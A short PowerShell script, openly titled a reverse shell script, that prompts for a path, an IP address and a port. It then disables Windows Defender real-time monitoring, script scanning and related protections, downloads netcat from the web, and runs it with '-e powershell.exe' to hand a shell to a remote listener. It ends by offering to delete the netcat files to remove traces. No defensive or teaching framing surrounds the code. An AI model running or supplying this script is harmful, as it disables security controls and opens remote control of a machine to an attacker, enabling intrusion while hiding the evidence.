#Reverse shell script to connect to remote PC
#Run on powershell

$NCpath = Read-Host -Prompt "insert path for downloading net-cat" 
$destIP = Read-Host -Prompt "insert the destination IP of the remote PC. Note: most be on same network"
$Port = Read-Host -Prompt "insert the port no. to connect through to the remote PC"

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableBlockAtFirstSeen $true 
#Disable all relevant features of firewall and windows defender. 
Start-Sleep -Seconds 5
Set-Location -Path $NCpath 
Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32clea-1.12.zip" -OutFile $NCpath
#Downloading NC from website.
$test = Get-Item -Path "$NCpath\netcat" 
if($null -ne $test) {
    Write-Host "Installation completed successfully" 
    #If the get-item command returns something, we assume NC was downloaded successfully. 
}
else {
    Write-Host "Could not install net-cat. Try checking network connctivity and account priviliges"
    break
    #If NC did not install successfully there us no point in continuing the script. 
}
Expand-Archive -LiteralPath "$NCpath\netcat-win32-1.12.zip" -DestinationPath "$NCpath\netcat" 
#Unzip netcat
Set-Location "$NCpath\netcat"
.\nc64.exe $destIP $Port -e powershell.exe
#Using NC's exe file to connect remotely to defined IP. The remote PC should have a NC listening session running: nc -lvp <port no.
Write-Host "Session is in progress"
$RemoveTrace = Read-Host -Prompt "Delete NC files? type y or n"
if($RemoveTrace -eq 'y'){
    Remove-Item -Path "$NCpath\netcat" -Force -Recurse -Confirm
    Write-Host "NC was deleted"
}
else{
    Write-Host "NC was not deleted it is still located in" $NCpath
}
